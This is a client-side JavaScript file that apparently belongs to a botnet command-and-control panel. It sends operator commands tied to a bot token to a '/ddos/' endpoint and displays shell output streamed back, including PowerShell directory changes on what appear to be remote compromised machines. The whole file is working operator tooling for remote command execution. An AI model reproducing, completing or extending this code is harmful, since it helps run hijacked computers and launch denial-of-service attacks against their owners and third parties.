function htmlEscape(str) {
    return str
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}

window.onload = function() {
    const cmd = document.getElementsByClassName("cmd-section")[0]
    const cmdHistory = document.querySelector(".cmd-history")
    const currentDirectory = document.getElementById("currentDirectory")
    cmd.scrollTop = cmd.scrollHeight

    const token = document.getElementById("command-form").getAttribute("bot-token")

    const source = new EventSource(`/sse/${token}`)

    source.addEventListener("new_result", function(event) {
        const data = JSON.parse(event.data)
        // console.log(data)
        // find the first command "waiting..."
        const waitingCommands = cmdHistory.querySelectorAll(".cmd-message.waiting");
        if (waitingCommands.length > 0) {
            const firstWaitingCommand = waitingCommands[0]; // get the first
            if (firstWaitingCommand.textContent.includes(data.command)) {
                // update it!!!
                firstWaitingCommand.classList.remove("waiting");
                firstWaitingCommand.textContent = firstWaitingCommand.textContent.replace(" (waiting...)", "");

                const command = data.command.toLowerCase().trim()
                if (command.startsWith("cd") || command.startsWith("set-location")) {
                    const newDir = data.result.trim()
                    currentDirectory.textContent = `${newDir}> `
                }

                const resultDiv = document.createElement("div");
                resultDiv.className = "cmd-message text-white";
                resultDiv.innerText = htmlEscape(data.result);
                firstWaitingCommand.insertAdjacentElement("afterend", resultDiv)
            }
        }
        cmd.scrollTop = cmd.scrollHeight
    })
}

document.getElementById("command-form").addEventListener("submit", (event) => {
    event.preventDefault()

    const token = event.currentTarget.getAttribute("bot-token")
    const command = document.getElementById("command").value.trim()
    const cmdHistory = document.querySelector(".cmd-history")
    const cmd = document.getElementsByClassName("cmd-section")[0]
    const currentDirectory = document.getElementById("currentDirectory").innerText

    if (command) {
        // add recent command line into cmd-history with tail (waiting...)
        const cmdMessage = document.createElement("div")
        cmdMessage.className = "cmd-message text-success bold-3 fw-bold fs-6 waiting";
        cmdMessage.innerHTML = htmlEscape(`${currentDirectory} ${command} (waiting...)`);
        cmdHistory.appendChild(cmdMessage)

        // remove the content in input
        document.getElementById("command").value=""
        cmd.scrollTop = cmd.scrollHeight

        // form sending...
        const formData = new FormData()
        formData.append("command", command)
    
        fetch (`/ddos/${token}/command`, {
            method: "POST",
            body: formData,
            credentials: "include"
        })
        .then(r=>r.json())
        .then(j=>{
            // console.log(j)
        })
        .catch(e=>console.error(e))
    }
})